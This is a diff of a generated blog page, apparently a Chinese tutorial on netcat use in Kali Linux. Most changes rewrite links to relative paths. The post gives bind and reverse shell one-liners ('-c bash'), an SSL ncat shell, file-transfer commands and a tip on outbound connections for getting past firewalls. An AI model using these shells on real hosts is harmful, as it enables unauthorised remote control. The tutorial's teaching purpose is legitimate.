@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="../../../../lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,24 +48,24 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="../../../../lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+<link href="../../../../css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+  <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon-next.png?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+  <link rel="icon" type="image/png" sizes="32x32" href="../../../../images/favicon-32x32-next.png?v=5.1.4">
 
 
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+  <link rel="icon" type="image/png" sizes="16x16" href="../../../../images/favicon-16x16-next.png?v=5.1.4">
 
 
-  <link rel="manifest" href="/images/manifest.json">
+  <link rel="mask-icon" href="../../../../images/logo.svg?v=5.1.4" color="#222">
+
+
+  <link rel="manifest" href="../../../../images/manifest.json">
 
 
 
@@ -184,7 +184,7 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -194,7 +194,7 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -204,7 +204,7 @@
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -214,7 +214,7 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -224,7 +224,7 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
+          <a href="" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -265,12 +265,12 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2018/09/22/nc/">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="image" content="../../../../images/head.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -317,7 +317,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/kali/" itemprop="url" rel="index">
+                  <a href="../../../../categories/kali/" itemprop="url" rel="index">
                     <span itemprop="name">kali</span>
                   </a>
                 </span>
@@ -355,18 +355,18 @@
 
       
         <h3 id="nc的用法"><a href="#nc的用法" class="headerlink" title="nc的用法"></a>nc的用法</h3><p>nc是渗透测试的瑞士军刀，大小只有100多K,但功能强大</p>
-<h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><p>基本命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv ***.***.***.***(目标ip) 目标端口</span><br></pre></td></tr></table></figure></p>
+<h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><p>基本命令<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv **<span class="strong">*.*</span>*<span class="strong">*.*</span>*<span class="strong">*.*</span>*<span class="strong">*(目标ip) 目标端口</span></span><br></pre></td></tr></table></figure></p>
 <p>eg. 1）ping出163服务器IP，pop3服务端口是110，stmp是25；<br>    2）监听端口，输入USER 用户名<cr> PASSWORD 密码<br>    3)就可以进行正常邮件服务<br>tips. pop3密码要用base64编码,kali下有直接的转换工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content</span><br><span class="line">&lt;C-D&gt;</span><br></pre></td></tr></table></figure></cr></p>
-<h2 id="传输文本"><a href="#传输文本" class="headerlink" title="传输文本"></a>传输文本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 开放端口</span><br><span class="line">B:nc -nv A的IP 开放端口</span><br></pre></td></tr></table></figure>
-<p>其中 -lp 为服务端 -nv为客户端<br>eg.电子取证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:ls -l(ps -autx)(lsof) |nc -nv B的IP 开放端口 </span><br><span class="line">B:nc -lp 开放端口&gt;receive.txt -q 1</span><br></pre></td></tr></table></figure></p>
+<h2 id="传输文本"><a href="#传输文本" class="headerlink" title="传输文本"></a>传输文本</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 开放端口</span><br><span class="line"><span class="keyword">B:nc </span>-nv A的<span class="built_in">IP</span> 开放端口</span><br></pre></td></tr></table></figure>
+<p>其中 -lp 为服务端 -nv为客户端<br>eg.电子取证<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:<span class="keyword">ls</span> -<span class="keyword">l</span>(<span class="keyword">ps</span> -autx)(lsof) |nc -nv B的IP 开放端口 </span><br><span class="line">B:nc -<span class="keyword">lp</span> 开放端口&gt;receive.txt -q <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
 <p>这样在不破坏A的情况下,把A的情况保存到B的receive文件中<br>q 1 为完成后1秒退出</p>
-<h2 id="传输文件-类似ftp"><a href="#传输文件-类似ftp" class="headerlink" title="传输文件(类似ftp)"></a>传输文件(类似ftp)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口 &gt; file(接收端)</span><br><span class="line">B:nc -nv A的IP 端口 &lt; file q 1</span><br></pre></td></tr></table></figure>
-<p>或者为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口 &lt; file q 1</span><br><span class="line">B:nc -nv A的IP 端口 &gt; file(接收端)</span><br></pre></td></tr></table></figure></p>
-<h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h2><p>正向<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口 -c bash (win 为cmd)</span><br><span class="line">B:nc -nv A的IP 端口(攻)</span><br></pre></td></tr></table></figure></p>
-<p>反向<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口(攻)</span><br><span class="line">B:nc -nv A的IP 端口 -c bash</span><br></pre></td></tr></table></figure></p>
+<h2 id="传输文件-类似ftp"><a href="#传输文件-类似ftp" class="headerlink" title="传输文件(类似ftp)"></a>传输文件(类似ftp)</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">A:</span><span class="string">nc</span> <span class="bullet">-lp</span> <span class="string">端口</span> <span class="string">&gt; file(接收端)</span></span><br><span class="line"><span class="string"></span><span class="attr">B:</span><span class="string">nc</span> <span class="bullet">-nv</span> <span class="string">A的IP</span> <span class="string">端口</span> <span class="string">&lt;</span> <span class="string">file</span> <span class="string">q</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>或者为<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -<span class="keyword">lp</span> 端口 &lt; <span class="keyword">file</span> q <span class="number">1</span></span><br><span class="line">B:nc -nv A的IP 端口 &gt; <span class="keyword">file</span>(接收端)</span><br></pre></td></tr></table></figure></p>
+<h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h2><p>正向<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口 -c <span class="keyword">bash </span>(win 为cmd)</span><br><span class="line"><span class="keyword">B:nc </span>-nv A的<span class="built_in">IP</span> 端口(攻)</span><br></pre></td></tr></table></figure></p>
+<p>反向<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 端口(攻)</span><br><span class="line"><span class="keyword">B:nc </span>-nv A的<span class="built_in">IP</span> 端口 -c <span class="keyword">bash</span></span><br></pre></td></tr></table></figure></p>
 <p>tips.通常情况下服务器会限制进来的流量,所以攻击者开放端口,服务器端主动连接<br>不会限制的端口DNS 53等<br>可以把NC服务写在开机启动,这样漏洞修复也能连上(还不会写,以后补)<br>另外win下下载死活不能启动,安全管家还给我删了,太负责了</p>
-<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>通常情况下nc不能加密传输,要用ncat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:ncat -c bash --allow 允许IP(B攻击者) -vnl 端口 --ssl</span><br><span class="line">B:ncat -nv A的IP 端口 --ssl</span><br></pre></td></tr></table></figure></p>
-<p>我的kali上没有ncat工具,根据经验自创命令下载安装,成功了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ncat</span><br></pre></td></tr></table></figure></p>
+<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>通常情况下nc不能加密传输,要用ncat<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:ncat -c <span class="keyword">bash </span>--allow 允许<span class="built_in">IP</span>(<span class="keyword">B攻击者) </span>-vnl 端口 --ssl</span><br><span class="line"><span class="keyword">B:ncat </span>-nv A的<span class="built_in">IP</span> 端口 --ssl</span><br></pre></td></tr></table></figure></p>
+<p>我的kali上没有ncat工具,根据经验自创命令下载安装,成功了<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install ncat</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -384,9 +384,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/kali/" rel="tag"># kali</a>
+            <a href="../../../../tags/kali/" rel="tag"># kali</a>
           
-            <a href="/tags/nc/" rel="tag"># nc</a>
+            <a href="../../../../tags/nc/" rel="tag"># nc</a>
           
         </div>
       
@@ -399,7 +399,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/22/序/" rel="next" title="序">
+              <a href="../序/" rel="next" title="序">
                 <i class="fa fa-chevron-left"></i> 序
               </a>
             
@@ -409,7 +409,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/24/ssh服务/" rel="prev" title="ssh服务">
+              <a href="../../../../2019/08/24/ssh服务/" rel="prev" title="ssh服务">
                 ssh服务 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -478,7 +478,7 @@
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image"
-                src="/images/head.jpg"
+                src="../../../../images/head.jpg"
                 alt="newird" />
             
               <p class="site-author-name" itemprop="name">newird</p>
@@ -490,7 +490,7 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives">
+                <a href="../../../../archives">
               
                   <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
@@ -502,7 +502,7 @@
               
               
               <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
+                <a href="../../../../categories/index.html">
                   <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
@@ -513,7 +513,7 @@
               
               
               <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
+                <a href="../../../../tags/index.html">
                   <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
@@ -680,64 +680,64 @@
 
   
   
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+    <script type="text/javascript" src="../../../../lib/jquery/index.js?v=2.1.3"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+    <script type="text/javascript" src="../../../../lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+    <script type="text/javascript" src="../../../../lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="../../../../lib/velocity/velocity.min.js?v=1.2.1"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="../../../../lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
   
 
   
   
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+    <script type="text/javascript" src="../../../../lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
   
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+  <script type="text/javascript" src="../../../../js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="../../../../js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="../../../../js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="../../../../js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="../../../../js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="../../../../js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="../../../../js/src/bootstrap.js?v=5.1.4"></script>
 
 
 
